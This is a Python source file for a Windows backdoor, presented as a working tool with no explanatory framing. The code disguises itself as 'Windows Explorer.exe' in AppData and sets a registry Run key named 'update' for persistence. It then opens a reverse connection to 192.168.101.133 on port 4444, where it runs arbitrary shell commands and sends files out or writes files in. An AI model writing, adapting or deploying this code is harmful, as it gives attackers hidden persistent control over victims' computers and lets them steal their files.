#!/usr/bin/env python
import base64
import os
import shutil
import socket
import subprocess, json
import sys

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    def become_persistent(self):
        file_location= os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable,file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d"' + file_location+'"',shell=True)
    def execute_system_command(self, command):
        DEVNULL=open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = " "
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_directory(self, path):
        os.chdir(path)
        return "[+]Changing directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result="[-]Error during command execution"
            self.reliable_send(command_result)


backdoor = Backdoor("192.168.101.133", 4444)
backdoor.run()